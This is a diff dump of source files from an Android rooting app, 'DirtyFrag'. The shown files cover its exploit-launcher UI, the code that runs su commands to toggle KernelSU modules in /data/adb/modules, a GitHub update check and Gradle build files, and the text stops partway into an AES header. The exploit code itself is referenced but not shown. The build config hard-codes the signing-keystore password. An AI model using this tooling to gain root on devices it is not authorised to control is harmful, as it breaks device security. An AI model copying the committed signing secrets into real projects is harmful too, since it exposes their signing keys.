+                && binding.switchBootStart.isChecked());
+    }
+
+    /** Re-read the modules state when returning to the app: if the user just
+     *  granted root in the KSU manager, the toggle updates immediately
+     *  instead of staying stale until the next app open. */
+    @Override
+    protected void onResume() {
+        super.onResume();
+        mExec.execute(this::refreshModuleState);
+    }
+
+    private void setRootedState() {
+        setRootedState(true);
+    }
+
+    /** Runs a command as root (su). Returns stdout, or null when su is
+     *  unavailable (module not loaded / not granted). Sets suState with the
+     *  failure reason for the UI. */
+    private String suState = "unknown";
+    private String runSu(String cmd) {
+        suState = "unknown";
+        try {
+            Process p = Runtime.getRuntime().exec(new String[]{"su", "-c", cmd});
+            java.io.BufferedReader r = new java.io.BufferedReader(
+                    new java.io.InputStreamReader(p.getInputStream()));
+            java.io.BufferedReader err = new java.io.BufferedReader(
+                    new java.io.InputStreamReader(p.getErrorStream()));
+            StringBuilder sb = new StringBuilder();
+            String ln;
+            while ((ln = r.readLine()) != null) sb.append(ln).append('\n');
+            StringBuilder eb = new StringBuilder();
+            while ((ln = err.readLine()) != null) eb.append(ln).append('\n');
+            err.close();
+            r.close();
+            int rc = p.waitFor();
+            if (rc == 0) {
+                suState = "ok";
+                return sb.toString();
+            }
+            suState = ("denied (rc " + rc + ")" + (eb.length() > 0 ? ": " + eb.toString().trim() : ""));
+            Log.i(TAG, "su probe failed: " + suState);
+            return null;
+        } catch (Exception e) {
+            suState = "not found";
+            return null;
+        }
+    }
+
+    /** Reads the modules' disable-flag state from /data/adb/modules via su and
+     *  syncs the toggle. All-disabled = switch off, otherwise on. */
+    private void refreshModuleState() {
+        String mods = runSu("ls /data/adb/modules 2>/dev/null");
+        if (mods == null) {
+            mMain.post(() -> {
+                moduleRefresh = true;
+                binding.switchModules.setChecked(false);
+                binding.switchModules.setEnabled(false);
+                moduleRefresh = false;
+                binding.modulesSubtitle.setText("not found".equals(suState)
+                        ? "Requires root (run the exploit first)"
+                        : "No Modules Installed");
+            });
+            return;
+        }
+        int total = 0;
+        for (String s : mods.split("\n")) if (!s.trim().isEmpty()) total++;
+        if (total == 0) {
+            mMain.post(() -> {
+                moduleRefresh = true;
+                binding.switchModules.setChecked(false);
+                binding.switchModules.setEnabled(false);
+                moduleRefresh = false;
+                Log.i(TAG, "modules toggle: no modules installed");
+                binding.modulesSubtitle.setText("No Modules Installed");
+            });
+            return;
+        }
+        String dis = runSu("ls /data/adb/modules/*/disable 2>/dev/null");
+        int disabled = 0;
+        if (dis != null) for (String s : dis.split("\n")) if (!s.trim().isEmpty()) disabled++;
+        boolean allDisabled = disabled >= total;
+        final int fTotal = total, fDisabled = Math.min(disabled, total);
+        String text = fDisabled == 0
+                ? "Enabled - Active at next reroot"
+                : fDisabled == fTotal
+                    ? "Disabled - No Modules on reroot"
+                    : fDisabled + " of " + fTotal + " disabled - applies at next reroot";
+        Log.i(TAG, "modules toggle: " + fDisabled + "/" + fTotal + " disabled -> " + text);
+        mMain.post(() -> {
+            moduleRefresh = true;
+            binding.switchModules.setChecked(!allDisabled);
+            binding.switchModules.setEnabled(true);
+            moduleRefresh = false;
+            binding.modulesSubtitle.setText(text);
+        });
+    }
+
+    /** Applies the toggle: disable = touch a `disable` flag in every module,
+     *  enable = remove them. Takes effect at the next reboot (modules are
+     *  mounted during boot only). */
+    private void applyModuleState(boolean on) {
+        String cmd = on
+                ? "rm -f /data/adb/modules/*/disable 2>/dev/null"
+                : "for d in /data/adb/modules/*/; do [ -f \"$d/module.prop\" ] && touch \"$d/disable\" 2>/dev/null; done";
+        mExec.execute(() -> {
+            String r = runSu(cmd);
+            mMain.post(() -> {
+                Toast.makeText(MainActivity.this,
+                        r == null ? "su not available"
+                                : on ? "KSU modules enabled - applies after reboot"
+                                : "KSU modules disabled - applies after reboot",
+                        Toast.LENGTH_SHORT).show();
+                refreshModuleState();
+            });
+        });
+    }
+
+    /** SamSU-style GitHub release check: the pill around the version turns
+     *  green when the latest published release tag differs from this build's
+     *  versionName. Silent on offline / rate-limit / API hiccups. */
+    private void checkForAppUpdate() {
+        try {
+            java.net.HttpURLConnection conn = (java.net.HttpURLConnection)
+                    new java.net.URL("https://api.github.com/repos/mitschud/DirtyFrag/releases/latest")
+                            .openConnection();
+            conn.setConnectTimeout(8000);
+            conn.setReadTimeout(8000);
+            conn.setRequestProperty("Accept", "application/vnd.github+json");
+            conn.setRequestProperty("User-Agent", "DirtyFrag");
+            if (conn.getResponseCode() != 200) return;
+            java.io.BufferedReader reader = new java.io.BufferedReader(
+                    new java.io.InputStreamReader(conn.getInputStream()));
+            StringBuilder body = new StringBuilder();
+            String line;
+            while ((line = reader.readLine()) != null) body.append(line);
+            reader.close();
+            String tag = new org.json.JSONObject(body.toString()).optString("tag_name", "");
+            if (tag.isEmpty()) {
+                Log.i(TAG, "update check: empty tag_name");
+                return;
+            }
+            String latest = tag.replaceFirst("^[vV]", "").trim();
+            String mine;
+            try {
+                mine = getPackageManager().getPackageInfo(getPackageName(), 0).versionName;
+            } catch (Exception e) {
+                return;
+            }
+            if (latest.equalsIgnoreCase(mine)) return;
+            Log.i(TAG, "update check: update available (latest=" + latest + ")");
+            mMain.post(() -> {
+                updateAvailable = true;
+                // Grow the pill from its left edge into the lime update state,
+                // same 250ms feel as the Run pill's shrink.
+                if (titleView != null) {
+                    android.animation.ValueAnimator a =
+                            android.animation.ValueAnimator.ofFloat(0f, 1f);
+                    a.setDuration(250);
+                    a.addUpdateListener(anim -> {
+                        pillSpan.setProgress((float) anim.getAnimatedValue());
+                        titleView.invalidate();
+                    });
+                    a.start();
+                } else {
+                    pillSpan.setProgress(1f);
+                }
+            });
+        } catch (Exception e) {
+            Log.i(TAG, "update check failed: " + e);
+        }
+    }
+
+    /** Failure presentation: left bar label "Failure", right label "Reboot",
+     *  bars + labels red, run pill greyed out like the Running/Rooted state.
+     *  The pill stays disabled because the vendor patch is page-cache only:
+     *  retrying without rebooting would fail the same way. */
+    private void setFailedState() {
+        binding.twoStep.setFailed(true);
+        binding.twoStep.setSeg1(seg1, "Failure");
+        binding.twoStep.setSeg2(1f, "Reboot", 0xFFE57373);
+        binding.btnRun.setEnabled(false);
+        binding.btnRun.setText("Run exploit");
+        binding.btnRun.setTextColor(0xFF6E6E6E);
+        binding.btnRun.setBackgroundTintList(ColorStateList.valueOf(0xFF1F1F1F));
+        ((com.google.android.material.button.MaterialButton) binding.btnRun)
+                .setStrokeColor(ColorStateList.valueOf(0xFF1F1F1F));
+        setCompactButton(false, false);
+    }
+
+    private void setRootedState(boolean rooted) {
+        runArmed = false;
+        binding.btnRun.setEnabled(!rooted);
+        binding.btnRun.setText(rooted ? "Rooted" : "Run exploit");
+        binding.btnRun.setTextColor(
+                rooted ? 0xFF6E6E6E : 0xFFE0E0E0);
+        binding.btnRun.setBackgroundTintList(ColorStateList.valueOf(
+                rooted ? 0xFF1F1F1F : 0xFF7A7A7A));
+        ((com.google.android.material.button.MaterialButton) binding.btnRun)
+                .setStrokeColor(ColorStateList.valueOf(
+                        rooted ? 0xFF1F1F1F : 0xFFA6A6A6));
+        // Rooted/running: shrink the pill left and pop the KSU circle next to
+        // it (lit when rooted); fresh run state: full-width pill, no circle.
+        setCompactButton(rooted, rooted);
+    }
+
+    /** Shrinks the main pill to the left and pops the KSU launcher circle
+     *  next to it (compact=true, ksuLit=lit after successful root), or
+     *  restores the full-width pill. */
+    private void setCompactButton(boolean compact, boolean ksuLit) {
+        // Fresh pill: 48% wide starting at the 26% guideline â†’ right edge at
+        // 74%. Compact: pill + 12dp gap + 54dp circle must occupy the same
+        // 48% total (left edge pinned), so pill = 48% - extras.
+        float target = 0.48f;
+        if (compact) {
+            float parentW = ((View) binding.btnRun.getParent()).getWidth();
+            if (parentW <= 0) parentW = getResources().getDisplayMetrics().widthPixels;
+            float density = getResources().getDisplayMetrics().density;
+            float extrasPx = (12f + 54f) * density;
+            target = Math.max(0.20f, 0.48f - extrasPx / parentW);
+        }
+        android.animation.ValueAnimator a =
+                android.animation.ValueAnimator.ofFloat(pillPercent, target);
+        a.setDuration(250);
+        a.addUpdateListener(anim -> {
+            pillPercent = (float) anim.getAnimatedValue();
+            androidx.constraintlayout.widget.ConstraintLayout.LayoutParams lp =
+                    (androidx.constraintlayout.widget.ConstraintLayout.LayoutParams)
+                            binding.btnRun.getLayoutParams();
+            lp.matchConstraintPercentWidth = pillPercent;
+            binding.btnRun.setLayoutParams(lp);
+        });
+        a.start();
+        binding.btnKsu.setEnabled(ksuLit);
+        boolean wasVisible = binding.btnKsu.getVisibility() == View.VISIBLE
+                && binding.btnKsu.getAlpha() > 0.99f;
+        binding.btnKsu.setBackgroundTintList(ColorStateList.valueOf(
+                ksuLit ? 0xFFB0B0B0 : 0xFF1F1F1F));
+        binding.btnKsu.setImageResource(R.drawable.ksu_logo);
+        if (compact && !wasVisible) {
+            // First appearance: pop in quickly.
+            binding.btnKsu.setVisibility(View.VISIBLE);
+            binding.btnKsu.setAlpha(0f);
+            binding.btnKsu.setScaleX(0.6f);
+            binding.btnKsu.setScaleY(0.6f);
+            binding.btnKsu.postDelayed(() -> binding.btnKsu.animate()
+                    .alpha(1f).scaleX(1f).scaleY(1f).setDuration(180)
+                    .withEndAction(() -> settleKsuTint(ksuLit)).start(), 150);
+        } else if (compact) {
+            // Already visible (state change): stay in place, just recolor.
+            settleKsuTint(ksuLit);
+        } else {
+            binding.btnKsu.animate().alpha(0f).scaleX(0.6f).scaleY(0.6f)
+                    .setDuration(200)
+                    .withEndAction(() -> binding.btnKsu.setVisibility(View.GONE))
+                    .start();
+        }
+    }
+
+    /** After the lit circle settles, ease it slightly towards grey. */
+    private void settleKsuTint(boolean ksuLit) {
+        if (!ksuLit) return;
+        android.animation.ValueAnimator g =
+                android.animation.ValueAnimator.ofFloat(0f, 1f);
+        g.setStartDelay(250);
+        g.setDuration(300);
+        g.addUpdateListener(anim -> binding.btnKsu
+                .setBackgroundTintList(ColorStateList.valueOf(
+                        mixColor(0xFFB0B0B0, 0xFF9A9A9E,
+                                (float) anim.getAnimatedValue()))));
+        g.start();
+    }
+
+    private void openKsu() {
+        // Try the known manager packages: official KernelSU, KernelSU-Next, APatch.
+        String[] candidates = {
+                "me.weishu.kernelsu", "com.rifsxd.ksunext", "me.bmax.apatch"};
+        PackageManager pm = getPackageManager();
+        for (String pkg : candidates) {
+            Intent launch = pm.getLaunchIntentForPackage(pkg);
+            if (launch != null) {
+                launch.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                startActivity(launch);
+                return;
+            }
+        }
+        Toast.makeText(this, "KernelSU manager not found", Toast.LENGTH_SHORT).show();
+    }
+
+    private static int mixColor(int a, int b, float t) {
+        int ar = (a >> 16) & 0xFF, ag = (a >> 8) & 0xFF, ab = a & 0xFF;
+        int br = (b >> 16) & 0xFF, bg = (b >> 8) & 0xFF, bb = b & 0xFF;
+        return 0xFF000000
+                | (Math.round(ar + (br - ar) * t) << 16)
+                | (Math.round(ag + (bg - ag) * t) << 8)
+                | Math.round(ab + (bb - ab) * t);
+    }
+
+    /** Saves the current log to Downloads and opens the Downloads screen. */
+    private void shareLog() {
+        String log = logBuffer.length() > 0 ? logBuffer.toString() : readLastLog();
+        if (log.trim().isEmpty()) {
+            return;
+        }
+        try {
+            ContentValues values = new ContentValues();
+            values.put(MediaStore.Downloads.DISPLAY_NAME, "dirtyfrag_log.txt");
+            values.put(MediaStore.Downloads.MIME_TYPE, "text/plain");
+            Uri uri = getContentResolver().insert(
+                    MediaStore.Downloads.EXTERNAL_CONTENT_URI, values);
+            if (uri != null) {
+                try (java.io.OutputStream out = getContentResolver().openOutputStream(uri)) {
+                    out.write(log.getBytes(java.nio.charset.StandardCharsets.UTF_8));
+                }
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "save log failed", e);
+        }
+        try {
+            startActivity(new Intent(android.app.DownloadManager.ACTION_VIEW_DOWNLOADS));
+        } catch (Exception e) {
+            Log.e(TAG, "open downloads failed", e);
+        }
+    }
+
+    private void runExploit(boolean softReboot) {
+        try {
+            int rc = ExploitRunner.run(this, this, softReboot);
+            if (rc != 0) {
+                String why = rc == 1 ? "ksud exited with error" : "check logs";
+                report("\n=== exploit failed: " + why + " ===\n");
+            }
+            createDeviceProtectedStorageContext()
+                    .getSharedPreferences("dfroot", MODE_PRIVATE)
+                    .edit().putBoolean("last_run_success", rc == 0).apply();
+        } catch (Exception e) {
+            Log.e(TAG, "exploit exception", e);
+            report("\nexception: " + e + "\n");
+        } finally {
+            mMain.post(() -> {
+                running = false;
+                boolean rooted = new File("/dev/df").exists();
+                if (rooted) {
+                    setRootedState(true);
+                    binding.twoStep.setSeg2(1f, "Verified", 0xFFFFFFFF);
+                } else {
+                    setRootedState(false);
+                    setFailedState();
+                }
+                updateLogVisibility();
+            });
+        }
+    }
+
+    private void openUrl(String url) {
+        try {
+            startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse(url)));
+        } catch (Exception e) {
+            Toast.makeText(this, "No browser found", Toast.LENGTH_SHORT).show();
+        }
+    }
+
+}
+
+============================================================
+
+FILE: ./app/src/main/java/df/root/OneUiSwitch.java
+============================================================
+package df.root;
+
+import android.animation.ValueAnimator;
+import android.content.Context;
+import android.graphics.Canvas;
+import android.graphics.Paint;
+import android.graphics.RectF;
+import android.util.AttributeSet;
+import android.view.HapticFeedbackConstants;
+import android.view.View;
+import android.view.animation.DecelerateInterpolator;
+
+/**
+ * OneUI-style switch drawn from scratch: 46x28dp pill, constant-size 21dp
+ * thumb (3.5dp margin) in both states, 160ms slide + color fade.
+ */
+public class OneUiSwitch extends View {
+
+    // Geometry (dp)
+    private static final float TRACK_W = 46f, TRACK_H = 28f;
+    private static final float THUMB_D = 21f, MARGIN = 3.5f;
+
+    // Colors (strictly neutral grey - monochrome UI)
+    private static final int ON_TRACK = 0xFFC9C9C9,  ON_THUMB = 0xFF141414;
+    private static final int OFF_TRACK = 0xFF2E2E2E, OFF_THUMB = 0xFF8E8E8E;
+
+    private static final long ANIM_MS = 160;
+
+    private final Paint trackPaint = new Paint(Paint.ANTI_ALIAS_FLAG);
+    private final Paint thumbPaint = new Paint(Paint.ANTI_ALIAS_FLAG);
+    private final RectF trackRect = new RectF();
+    private final RectF thumbRect = new RectF();
+
+    private boolean checked = false;
+    private boolean enabledState = true;
+    private float progress = 0f; // 0 = off, 1 = on
+
+    private OnCheckedChangeListener listener;
+
+    public interface OnCheckedChangeListener {
+        void onCheckedChanged(OneUiSwitch view, boolean checked);
+    }
+
+    public OneUiSwitch(Context context) { this(context, null); }
+
+    public OneUiSwitch(Context context, AttributeSet attrs) {
+        super(context, attrs);
+        setClickable(true);
+        setFocusable(true);
+    }
+
+    public void setChecked(boolean checked) {
+        if (this.checked == checked) return;
+        this.checked = checked;
+        animateTo(checked ? 1f : 0f);
+        invalidate();
+    }
+
+    public boolean isChecked() { return checked; }
+
+    @Override
+    public void setEnabled(boolean enabled) {
+        super.setEnabled(enabled);
+        enabledState = enabled;
+        invalidate();
+    }
+
+    public void setOnCheckedChangeListener(OnCheckedChangeListener l) {
+        listener = l;
+    }
+
+    private void animateTo(float target) {
+        animate().cancel();
+        ValueAnimator a = ValueAnimator.ofFloat(progress, target);
+        a.setDuration(ANIM_MS);
+        a.setInterpolator(new DecelerateInterpolator());
+        a.addUpdateListener(anim -> {
+            progress = (float) anim.getAnimatedValue();
+            invalidate();
+        });
+        a.start();
+    }
+
+    @Override
+    public boolean performClick() {
+        if (!enabledState) return false;
+        performHapticFeedback(HapticFeedbackConstants.KEYBOARD_TAP);
+        boolean next = !checked;
+        setChecked(next);
+        if (listener != null) listener.onCheckedChanged(this, next);
+        return super.performClick();
+    }
+
+    @Override
+    protected void onMeasure(int wSpec, int hSpec) {
+        int w = (int) (TRACK_W * getResources().getDisplayMetrics().density);
+        int h = (int) (TRACK_H * getResources().getDisplayMetrics().density);
+        setMeasuredDimension(resolveSize(w, wSpec), resolveSize(h, hSpec));
+    }
+
+    @Override
+    protected void onDraw(Canvas canvas) {
+        float d = getResources().getDisplayMetrics().density;
+        float w = getWidth(), h = getHeight();
+
+        // Track colors fade between states; disabled renders the OFF look.
+        boolean on = checked;
+        int trackCol = on ? ON_TRACK : OFF_TRACK;
+        int thumbCol = on ? ON_THUMB : OFF_THUMB;
+        trackPaint.setColor(trackCol);
+        thumbPaint.setColor(thumbCol);
+
+        trackRect.set(0, 0, w, h);
+        canvas.drawRoundRect(trackRect, h / 2f, h / 2f, trackPaint);
+
+        float ty = MARGIN * d;
+        float txTravel = w - (THUMB_D + 2 * MARGIN) * d;
+        float tx = ty + txTravel * progress;
+        thumbRect.set(tx, ty, tx + THUMB_D * d, ty + THUMB_D * d);
+        canvas.drawRoundRect(thumbRect, THUMB_D * d / 2f, THUMB_D * d / 2f, thumbPaint);
+    }
+}
+============================================================
+
+FILE: ./app/src/main/java/df/root/TwoStepProgressView.java
+============================================================
+package df.root;
+
+import android.content.Context;
+import android.graphics.Canvas;
+import android.graphics.Paint;
+import android.graphics.RectF;
+import android.util.AttributeSet;
+import android.view.View;
+
+/**
+ * OneUI-system-update-style two-segment progress bar.
+ * Left segment: exploit run progress (0..100%), labeled with the percentage.
+ * Right segment: verification step (fills during cleanup), labeled
+ * "Verification" while running, then "Verified" / "Failed".
+ */
+public class TwoStepProgressView extends View {
+
+    private static final int BAR_H_DP = 4;
+    private static final int GAP_DP = 12;
+    private static final int TRACK = 0xFF2E2E30;
+    private static final int FILL = 0xFF4E8AE8;
+    private static final int FILL_GREY = 0xFF2A2A2E;
+    private static final int FAILED_RED = 0xFFE57373;
+    private static final int LABEL_GREY = 0xFF47474A;
+
+    private final Paint trackPaint = new Paint(Paint.ANTI_ALIAS_FLAG);
+    private final Paint fillPaint = new Paint(Paint.ANTI_ALIAS_FLAG);
+    private final Paint textPaint = new Paint(Paint.ANTI_ALIAS_FLAG);
+    private final RectF rect = new RectF();
+
+    private float seg1 = 0f;
+    private float seg2 = 0f;
+    private String leftLabel = "Waiting";
+    private String rightLabel = "Verification";
+    private int rightColor = 0xFF8E8E8E;
+    private boolean failed;
+    private float greyMix = 0f;
+    private android.animation.ValueAnimator greyAnimator;
+
+    public TwoStepProgressView(Context context) { this(context, null); }
+
+    public TwoStepProgressView(Context context, AttributeSet attrs) {
+        super(context, attrs);
+        textPaint.setTextAlign(Paint.Align.CENTER);
+    }
+
+    /** @param p 0..1 */
+    public void setSeg1(float p, String label) {
+        seg1 = clamp(p);
+        leftLabel = label;
+        invalidate();
+    }
+
+    public void setSeg2(float p, String label, int labelColor) {
+        seg2 = clamp(p);
+        rightLabel = label;
+        rightColor = labelColor;
+        if ("Verified".equals(label) && seg1 >= 1f) {
+            scheduleGreyOut();
+        } else {
+            cancelGreyOut();
+        }
+        invalidate();
+    }
+
+    /** Failure mode: bars + labels turn red (same red as the Failed text). */
+    public void setFailed(boolean f) {
+        failed = f;
+        if (f) cancelGreyOut();
+        invalidate();
+    }
+
+    public void reset() {
+        cancelGreyOut();
+        failed = false;
+        setSeg1(0f, "Waiting");
+        setSeg2(0f, "Verification", 0xFFFFFFFF);
+    }
+
+    /** When the bar reaches 100% + Verified, ease the fill from blue to grey
+     *  after a short pause so it blends into the dark UI. */
+    private void scheduleGreyOut() {
+        if (greyAnimator != null) return;
+        greyAnimator = android.animation.ValueAnimator.ofFloat(0f, 1f);
+        greyAnimator.setStartDelay(2000);
+        greyAnimator.setDuration(400);
+        greyAnimator.addUpdateListener(a -> {
+            greyMix = (float) a.getAnimatedValue();
+            invalidate();
+        });
+        greyAnimator.start();
+    }
+
+    private void cancelGreyOut() {
+        if (greyAnimator != null) {
+            greyAnimator.cancel();
+            greyAnimator = null;
+        }
+        greyMix = 0f;
+    }
+
+    private static int mixColor(int a, int b, float t) {
+        int ar = (a >> 16) & 0xFF, ag = (a >> 8) & 0xFF, ab = a & 0xFF;
+        int br = (b >> 16) & 0xFF, bg = (b >> 8) & 0xFF, bb = b & 0xFF;
+        return 0xFF000000
+                | (Math.round(ar + (br - ar) * t) << 16)
+                | (Math.round(ag + (bg - ag) * t) << 8)
+                | Math.round(ab + (bb - ab) * t);
+    }
+
+    private static float clamp(float v) {
+        return Math.max(0f, Math.min(1f, v));
+    }
+
+    @Override
+    protected void onMeasure(int wSpec, int hSpec) {
+        float d = getResources().getDisplayMetrics().density;
+        setMeasuredDimension(
+                resolveSize((int) (200 * d), wSpec),
+                resolveSize((int) (54 * d), hSpec));
+    }
+
+    @Override
+    protected void onDraw(Canvas canvas) {
+        float d = getResources().getDisplayMetrics().density;
+        float w = getWidth();
+        float barH = BAR_H_DP * d;
+        float gap = GAP_DP * d;
+        float half = (w - gap) / 2f;
+
+        // Bars. Red while failed, otherwise blue easing to grey once Verified settles.
+        trackPaint.setColor(TRACK);
+        fillPaint.setColor(failed ? FAILED_RED
+                : mixColor(FILL, FILL_GREY, greyMix));
+
+        rect.set(0, 0, half, barH);
+        canvas.drawRoundRect(rect, barH / 2f, barH / 2f, trackPaint);
+        if (seg1 > 0f) {
+            rect.set(0, 0, Math.max(barH, half * seg1), barH);
+            canvas.drawRoundRect(rect, barH / 2f, barH / 2f, fillPaint);
+        }
+
+        rect.set(half + gap, 0, w, barH);
+        canvas.drawRoundRect(rect, barH / 2f, barH / 2f, trackPaint);
+        if (seg2 > 0f) {
+            rect.set(half + gap, 0, half + gap + Math.max(barH, half * seg2), barH);
+            canvas.drawRoundRect(rect, barH / 2f, barH / 2f, fillPaint);
+        }
+
+        // Labels centered under each segment, dropped well below the bar.
+        // NOTE: setTextSize must happen BEFORE reading ascent(), otherwise the
+        // first draw uses default-size metrics and the label jumps on the
+        // next render (e.g. after returning from the background).
+        textPaint.setTextSize(15 * d);
+        float ty = barH + 15 * d - textPaint.ascent();
+        // Labels grey out together with the bars once Verified settles; both
+        // turn red in failure mode.
+        textPaint.setColor(mixColor(failed ? FAILED_RED : 0xFFFFFFFF,
+                LABEL_GREY, greyMix));
+        canvas.drawText(leftLabel, half / 2f, ty, textPaint);
+        textPaint.setColor(mixColor(rightColor, LABEL_GREY, greyMix));
+        canvas.drawText(rightLabel, half + gap + half / 2f, ty, textPaint);
+    }
+}
+============================================================
+
+FILE: ./app/src/main/java/df/root/VersionPillSpan.java
+============================================================
+package df.root;
+
+import android.graphics.Canvas;
+import android.graphics.Paint;
+import android.graphics.RectF;
+import android.text.style.ReplacementSpan;
+
+/** Rounded pill drawn around the version digits in the header title.
+ *  Grey ("1.07") normally; when an update is available it grows from its
+ *  left edge into a lime pill reading "Update available". The growth is
+ *  driven by {@link #setProgress(float)} + invalidating the title view. */
+public class VersionPillSpan extends ReplacementSpan {
+
+    private static final String UPDATE_TEXT = "Update available";
+
+    private final float scale; // version text size relative to the title
+    private final Paint textPaint = new Paint(Paint.ANTI_ALIAS_FLAG);
+    private final Paint bgPaint = new Paint(Paint.ANTI_ALIAS_FLAG);
+    private float progress;    // 0 = compact grey "1.07", 1 = lime update pill
+
+    public VersionPillSpan(float scale) {
+        this.scale = scale;
+    }
+
+    /** Animation driver: 0 = compact grey, 1 = full lime update pill. */
+    public void setProgress(float p) {
+        progress = Math.max(0f, Math.min(1f, p));
+    }
+
+    private static float lerp(float a, float b, float t) {
+        return a + (b - a) * t;
+    }
+
+    private static int lerpColor(int a, int b, float t) {
+        int ar = (a >> 16) & 0xFF, ag = (a >> 8) & 0xFF, ab = a & 0xFF;
+        int br = (b >> 16) & 0xFF, bg = (b >> 8) & 0xFF, bb = b & 0xFF;
+        return 0xFF000000
+                | ((int) lerp(ar, br, t) << 16)
+                | ((int) lerp(ag, bg, t) << 8)
+                | (int) lerp(ab, bb, t);
+    }
+
+    @Override
+    public int getSize(Paint paint, CharSequence text, int start, int end,
+                       Paint.FontMetricsInt fm) {
+        textPaint.set(paint);
+        textPaint.setTextSize(paint.getTextSize() * scale);
+        float padX = paint.getTextSize() * 0.22f;
+        // Reserve the full width so the title layout never reflows while the
+        // pill animates; the grey state simply occupies the left part.
+        return (int) (textPaint.measureText(UPDATE_TEXT) + 2 * padX);
+    }
+
+    @Override
+    public void draw(Canvas canvas, CharSequence text, int start, int end,
+                     float x, int top, int bottom, int baseline, Paint paint) {
+        textPaint.set(paint);
+        textPaint.setTextSize(paint.getTextSize() * scale);
+
+        float padX = paint.getTextSize() * 0.22f;
+        float digitW = textPaint.measureText(text, start, end);
+        float fullW = textPaint.measureText(UPDATE_TEXT);
+        float compactW = digitW + 2 * padX;
+        float fullPillW = fullW + 2 * padX;
+
+        // The pill's visual band is the CAP HEIGHT of the pill text (digits
+        // have no ascenders/descenders). Sizing it from the font's full
+        // ascent is what pushed the digits toward the pill's bottom: the
+        // ascent carries ~0.2em of accent headroom above the digits.
+        float capSmall = textPaint.getTextSize() * 0.7f;
+        float padY = capSmall * 0.45f; // big, but floating clear of cap top and baseline
+        float pillH = capSmall + 2 * padY;
+
+        // Center the pill HIGH on the headline: empirical on-device
+        // calibration showed the band-middle formula rendered low next to
+        // the word, so the center is raised 0.35 cap-height above the
+        // cap-band middle.
+        float capHeight = paint.getTextSize() * 0.7f;
+        float lineCenter = baseline - capHeight * 0.85f;
+        float pillTop = lineCenter - pillH / 2f;
+        float pillBottom = lineCenter + pillH / 2f;
+
+        float pillW = lerp(compactW, fullPillW, progress);
+        bgPaint.setColor(lerpColor(0xFF2E2E30, 0xFFAEEA00, progress));
+        canvas.drawRoundRect(
+                new RectF(x, pillTop, x + pillW, pillBottom),
+                pillH / 2f, pillH / 2f, bgPaint);
+
+        // Digits dead-centered inside the pill (their band is symmetric
+        // around the pill's center).
+        float digitBaseline = lineCenter + capSmall / 2f;
+
+        // "1.07" fades out while "Update available" fades in, both anchored
+        // to the pill's left edge so the growth reads as expanding text.
+        if (progress < 1f) {
+            int fg = lerpColor(0xFFD9D9D9, 0xFF101418, progress);
+            textPaint.setColor((fg & 0xFFFFFF) | ((int) (255 * (1 - progress)) << 24));
+            canvas.drawText(text, start, end, x + padX, digitBaseline, textPaint);
+        }
+        if (progress > 0f) {
+            textPaint.setColor((0xFF101418 & 0xFFFFFF) | ((int) (255 * progress) << 24));
+            canvas.drawText(UPDATE_TEXT, x + padX, digitBaseline, textPaint);
+        }
+    }
+}
+
+============================================================
+
+FILE: ./app/build.gradle.kts
+============================================================
+plugins {
+    id("com.android.application")
+}
+
+android {
+    namespace = "df.root"
+    compileSdk = 36
+
+    defaultConfig {
+        applicationId = "df.root"
+        minSdk = 32
+        targetSdk = 36
+        versionCode = 28
+        versionName = "1.08"
+
+        ndk {
+            abiFilters += listOf("arm64-v8a")
+        }
+    }
+
+    signingConfigs {
+        create("keystore") {
+            storeFile = file("keystore.jks")
+            storePassword = "dirtyfrag"
+            keyAlias = "dirtyfrag"
+            keyPassword = "dirtyfrag"
+        }
+    }
+
+    buildTypes {
+        debug {
+            signingConfig = signingConfigs.getByName("keystore")
+        }
+        release {
+            signingConfig = signingConfigs.getByName("keystore")
+            isMinifyEnabled = true
+            isShrinkResources = true
+            proguardFiles(
+                getDefaultProguardFile("proguard-android-optimize.txt"),
+                "proguard-rules.pro"
+            )
+        }
+    }
+
+    applicationVariants.all {
+        outputs.all {
+            (this as com.android.build.gradle.internal.api.BaseVariantOutputImpl).outputFileName = "dirtyfrag.apk"
+        }
+    }
+
+    compileOptions {
+        sourceCompatibility = JavaVersion.VERSION_11
+        targetCompatibility = JavaVersion.VERSION_11
+    }
+
+    lint {
+        checkReleaseBuilds = false
+    }
+
+    buildFeatures {
+        viewBinding = true
+    }
+
+    externalNativeBuild {
+        cmake {
+            path("src/main/jni/CMakeLists.txt")
+        }
+    }
+
+    packaging {
+        jniLibs {
+            useLegacyPackaging = true
+        }
+    }
+}
+
+dependencies {
+    implementation(libs.androidx.appcompat)
+    implementation(libs.material)
+    implementation(libs.androidx.constraintlayout)
+}
+
+============================================================
+
+FILE: ./build.gradle.kts
+============================================================
+plugins {
+    id("com.android.application") version "8.7.3" apply false
+}
+
+============================================================
+
+FILE: ./settings.gradle.kts
+============================================================
+pluginManagement {
+    repositories {
+        google()
+        mavenCentral()
+        gradlePluginPortal()
+    }
+}
+dependencyResolutionManagement {
+    repositoriesMode.set(RepositoriesMode.FAIL_ON_PROJECT_REPOS)
+    repositories {
+        google()
+        mavenCentral()
+    }
+}
+
+rootProject.name = "DirtyFrag"
+include(":app")
+
+============================================================
+
+FILE: ./app/src/main/jni/aes256.h
+============================================================
+#pragma once
+#include <stdint.h>
+
+/* Minimal AES-256 ECB single-block decrypt (FIPS 197). */
+
+static const uint8_t _sbox[256] = {
+    0x63,0x7c,0x77,0x7b,0xf2,0x6b,0x6f,0xc5,0x30,0x01,0x67,0x2b,0xfe,0xd7,0xab,0x76,
+    0xca,0x82,0xc9,0x7d,0xfa,0x59,0x47,0xf0,0xad,0xd4,0xa2,0xaf,0x9c,0xa4,0x72,0xc0,
+    0xb7,0xfd,0x93,0x26,0x36,0x3f,0xf7,0xcc,0x34,0xa5,0xe5,0xf1,0x71,0xd8,0x31,0x15,
+    0x04,0xc7,0x23,0xc3,0x18,0x96,0x05,0x9a,0x07,0x12,0x80,0xe2,0xeb,0x27,0xb2,0x75,
+    0x09,0x83,0x2c,0x1a,0x1b,0x6e,0x5a,0xa0,0x52,0x3b,0xd6,0xb3,0x29,0xe3,0x2f,0x84,
+    0x53,0xd1,0x00,0xed,0x20,0xfc,0xb1,0x5b,0x6a,0xcb,0xbe,0x39,0x4a,0x4c,0x58,0xcf,
+    0xd0,0xef,0xaa,0xfb,0x43,0x4d,0x33,0x85,0x45,0xf9,0x02,0x7f,0x50,0x3c,0x9f,0xa8,
+    0x51,0xa3,0x40,0x8f,0x92,0x9d,0x38,0xf5,0xbc,0xb6,0xda,0x21,0x10,0xff,0xf3,0xd2,
